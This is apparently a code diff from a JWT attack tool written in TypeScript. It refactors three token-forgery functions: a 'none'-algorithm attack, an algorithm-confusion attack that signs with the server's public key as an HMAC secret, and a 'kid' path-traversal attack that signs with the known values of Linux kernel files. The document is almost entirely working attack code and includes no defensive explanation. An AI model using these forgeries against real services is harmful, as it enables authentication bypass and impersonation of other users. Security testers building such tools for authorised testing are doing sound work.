@@ -1,8 +1,7 @@
 import { getJwtParts, encodeJwtPart } from "./jwt";
-import hmacSha256 from 'crypto-js/hmac-sha256'
-import Base64Url from 'crypto-js/enc-base64url'
 import { EKidPayload } from "~/commons/enums/kid-payloads-enum";
 import { NoneAttackEnum } from "~/commons/enums/none-attack-enum";
+import { EAlgorithms } from "~/commons/enums/algorithms-enum";
 
 export function noneAttack(token: string, algorithm: NoneAttackEnum) {
     const algorithms = {
@@ -21,33 +20,32 @@ export function noneAttack(token: string, algorithm: NoneAttackEnum) {
     return `${header}.${payload}.`;
 }
 
-export function algorithmConfusion(token: string, publicKey: string, symmetricAlg: string = "HS256") {
+export async function algorithmConfusion(token: string, publicKey: string, symmetricAlg: EAlgorithms = EAlgorithms.HS256) {
     let [header, payload] = getJwtParts(token);
 
     header.alg = symmetricAlg;
-
-    header = encodeJwtPart(header);
-    payload = encodeJwtPart(payload);
     
-    let sign = Base64Url.stringify(hmacSha256(`${header}.${payload}`, publicKey));
-
-    return `${header}.${payload}.${sign}`;
+    return await jwtSign({
+        header,
+        payload,
+        alg: symmetricAlg,
+        secretKey: publicKey,
+    });
 }
 
-export function kidPathTraversal(token: string, signaturePayload: EKidPayload) {
+export async function kidPathTraversal(token: string, signaturePayload: EKidPayload) {
     let [header, payload] = getJwtParts(token);
 
     header.kid = signaturePayload;
 
-    header = encodeJwtPart(header);
-    payload = encodeJwtPart(payload);
-
     const signatures = {
-        [EKidPayload.DEV_NULL]: '',
+        [EKidPayload.TIMER_MIGRATION]: 1,
         [EKidPayload.RANDOMIZE_VA_SPACE]: 2
     }
 
-    let sign = Base64Url.stringify(hmacSha256(`${header}.${payload}`, signatures[signaturePayload].toString()));
-
-    return `${header}.${payload}.${sign}`;
+    return await jwtSign({
+        header,
+        payload,
+        secretKey: signatures[signaturePayload].toString()
+    });
 }
